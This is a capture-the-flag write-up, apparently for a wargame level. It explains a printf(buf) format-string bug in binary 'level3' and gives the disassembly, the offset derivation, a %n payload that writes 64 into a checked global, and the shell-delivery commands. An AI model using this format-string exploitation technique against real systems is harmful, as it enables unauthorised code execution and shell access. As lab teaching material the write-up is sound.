# Way to level4

## Core
`v()` passes the `fgets` input **straight** into `printf(buf)` → format-string bug (FSB).
`%n` writes the count of characters printed so far to a target address. If global
`0x804988c` equals `0x40` (=64), `system` runs → use the FSB to write 64 into that global
and pass the branch. (the buffer is large but fgets caps the BOF)

## Decisive disass (full: `disas v`)
```
<+35>: call fgets@plt         ; 0x200B cap -> no BOF
<+49>: call printf@plt        ; printf(buf) <- FSB site
<+54>: mov  0x804988c,%eax    ; global under test
<+59>: cmp  $0x40,%eax        ; 0x40 = 64, target value
<+62>: jne  v+116            ; on pass: system runs
```

## Exploit
- offset 4 (derivation): in `AAAA%x %x %x %x`, `41414141` appears at the **4th** `%x` →
  the first 4B of input are argument slot 4. (printf is in the same function `v` as fgets,
  so the slot is close)
- Value/address: address `0x804988c` (source: `mov 0x804988c` @ v+54), target `0x40 = 64`
  (cmp @ v+59).
- payload: `\x8c\x98\x04\x08` + `%08x%08x%044x` + `%n`.
  char count = addr 4 + 8 + 8 + 44 = **64**. (the three `%x` consume slots 1-3, `%n` writes
  to slot 4 = our address)
- Delivery: `system` runs `/bin/sh` → cat - trick (same as level1).
```bash
python -c 'print "\x8c\x98\x04\x08%08x%08x%044x%n"' > /tmp/exploit
cat /tmp/exploit - | ./level3
```

## Diff from previous
Through level2 everything was stack/return-address based (BOF). level3 introduces **the
FSB** — not a return address but writing a value to an arbitrary address via `%n`. The
value to write (64) is small, so one pad (`%044x`) suffices and only 1 address is needed.

